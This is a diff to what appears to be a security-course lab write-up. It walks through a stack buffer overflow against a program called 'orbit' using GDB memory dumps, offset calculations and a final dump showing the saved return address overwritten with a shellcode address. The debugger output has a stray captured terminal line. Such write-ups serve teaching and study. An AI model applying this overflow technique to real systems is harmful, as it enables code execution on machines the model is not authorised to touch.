@@ -356,3 +356,76 @@ I left much of the default code in the `interact` file the same and added just a
 The `buf` variable is a character array size `MAX_BUFFSIZE` which is defined at the top of the `orbic.c` file as `128` bytes. I wrote garbage for `127` bytes and then added a newline character in order to keep `f.write` happy. I also found the location of the RIP to be at `0xffffd73c` and subtracted this address from the end of `buf` which is `0xffffd728`. `0xffffd73c - 0xffffd728 = 20`. Therefore, `20` bytes of garbage needs to be added after filling up `buf` in order to get to the RIP.
 
 ### GDB
+```
+(gdb) b 32
+Breakpoint 1 at 0x8049238: file orbit.c, line 32.
+(gdb) r
+Starting program: /home/deneb/orbit < /tmp/tmp.EGgCKb > /tmp/tmp.DMleKp
+
+Breakpoint 1, read_file () at orbit.c:32
+32          fd = open(FILENAME, O_RDONLY);
+(gdb) x/40x buf
+0xffffd6a8:     0x00000020      0x00000008      0x00001000      0x00000000
+0xffffd6b8:     0x00000000      0x0804904a      0x00000000      0x000003ed
+0xffffd6c8:     0x000003ed      0x000003ed      0x000003ed      0xffffd8ab
+0xffffd6d8:     0x078bfbfd      0x00000064      0x00000000      0x00000000
+0xffffd6e8:     0x00000000      0x00000000      0x00000000      0x00000001
+0xffffd6f8:     0x00000000      0xffffd89b      0x00000000      0x00000000
+0xffffd708:     0x00000000      0x00000000      0x00000000      0xffffdfe6
+0xffffd718:     0xf7ffc540      0xf7ffc000      0x00000000      0x00000000
+0xffffd728:     0x00000000      0x00000000      0x00000000      0x00000000
+0xffffd738:     0xffffd748      0x0804939c      0x00000001      0x08049391
+(gdb) i f
+Stack level 0, frame at 0xffffd740:
+ eip = 0x8049238 in read_file (orbit.c:32); saved eip = 0x804939c
+ called by frame at 0xffffd750
+n%s", buf);                                                     \ source language c.
+ Arglist at 0xffffd738, args: 
+ Locals at 0xffffd738, Previous frame's sp is 0xffffd740
+ Saved registers:
+  ebp at 0xffffd738, eip at 0xffffd73c
+```
+This is the hex dump right when the program is started and before the exploit has begun. You can see that there are actually a couple of rows of compiler padding between the end of `buf` and the saved ebp and eip. I accounted for that in my exploit as stated in the **Magic Numbers** section above.
+```
+ 51                                                                                               │(gdb) b 39
+ 52     buf[bytes_read] = 0;                                                                      │Breakpoint 2 at 0x80492af: file orbit.c, line 41.
+ 53     printf("Here is the file!\n%s", buf);                                                     │(gdb) c
+ 54     close(fd);                                                                                │Continuing.
+ 55 }                                                                                             │
+ 56                                                                                               │Breakpoint 2, read_file () at orbit.c:41
+ 57 int main(void) {                                                                              │41          printf("How many bytes should I read? ");
+ 36                                                                                               │(gdb) x/40x buf
+ 37     if (file_is_too_big(fd)) {                                                                │0xffffd6a8:     0x00000020      0x00000008      0x00001000      0x00000000
+ 38         EXIT_WITH_ERROR("File too big!");                                                     │0xffffd6b8:     0x00000000      0x0804904a      0x00000000      0x000003ed
+ 39     }                                                                                         │0xffffd6c8:     0x000003ed      0x000003ed      0x000003ed      0xffffd8ab
+ 40                                                                                               │0xffffd6d8:     0x078bfbfd      0x00000064      0x00000000      0x00000000
+ 41     printf("How many bytes should I read? ");                                                 │0xffffd6e8:     0x00000000      0x00000000      0x00000000      0x00000001
+ 42     fflush(stdout);                                                                           │0xffffd6f8:     0x00000000      0xffffd89b      0x00000000      0x00000000
+ 43     if (scanf("%u", &bytes_to_read) != 1) {                                                   │0xffffd708:     0x00000000      0x00000000      0x00000000      0xffffdfe6
+ 44         EXIT_WITH_ERROR("Could not read the number of bytes to read!");                       │0xffffd718:     0xf7ffc540      0xf7ffc000      0x00000000      0x00000000
+ 45     }                                                                                         │0xffffd728:     0x00000000      0x00000003      0x00000000      0x00000000
+ 46                                                                                               │0xffffd738:     0xffffd748      0x0804939c      0x00000001      0x08049391
+ 47     bytes_read = read(fd, buf, bytes_to_read);                                                │(gdb) p buf
+```
+After jumping to the next breakpoint (after the file read), `buf` reflects the contents of the file before the exploit occurs. In the next line of code, the program will stall as it awaits the user prompt for how many bytes to read.
+```
+ 40                                                                                               │(gdb) b 53
+ 41     printf("How many bytes should I read? ");                                                 │Breakpoint 3 at 0x8049369: file orbit.c, line 53.
+ 42     fflush(stdout);                                                                           │(gdb) c
+ 43     if (scanf("%u", &bytes_to_read) != 1) {                                                   │Continuing.
+ 44         EXIT_WITH_ERROR("Could not read the number of bytes to read!");                       │
+ 45     }                                                                                         │Breakpoint 3, read_file () at orbit.c:53
+ 46                                                                                               │53          printf("Here is the file!\n%s", buf);
+ 47     bytes_read = read(fd, buf, bytes_to_read);                                                │(gdb) x/40x buf
+ 48     if (bytes_read == -1) {                                                                   │0xffffd6a8:     0x41414141      0x41414141      0x41414141      0x41414141
+ 49         EXIT_WITH_ERROR("Could not read!");                                                   │0xffffd6b8:     0x41414141      0x41414141      0x41414141      0x41414141
+ 50     }                                                                                         │0xffffd6c8:     0x41414141      0x41414141      0x41414141      0x41414141
+ 51                                                                                               │0xffffd6d8:     0x41414141      0x41414141      0x41414141      0x41414141
+ 52     buf[bytes_read] = 0;                                                                      │0xffffd6e8:     0x41414141      0x41414141      0x41414141      0x41414141
+ 53     printf("Here is the file!\n%s", buf);                                                     │0xffffd6f8:     0x41414141      0x41414141      0x41414141      0x41414141
+ 54     close(fd);                                                                                │0xffffd708:     0x41414141      0x41414141      0x41414141      0x41414141
+ 55 }                                                                                             │0xffffd718:     0x41414141      0x41414141      0x41414141      0x0a414141
+ 56                                                                                               │0xffffd728:     0x000000e0      0x61616161      0x61616161      0x61616161
+ 57 int main(void) {                                                                              │0xffffd738:     0x61616161      0xffffd740      0xdb31c031      0xd231c931
+```
+Jumping to the final breakpoint, during the stall, the file is overwritten with my exploit, which overflows `buf` and into the SFP and RIP, writing garbage into the SFP (`0x61616161`), and the address to `SHELLCODE` in the RIP. Then the `read_file` function "returns" and `SHELLCODE` is run. Exploit complete.
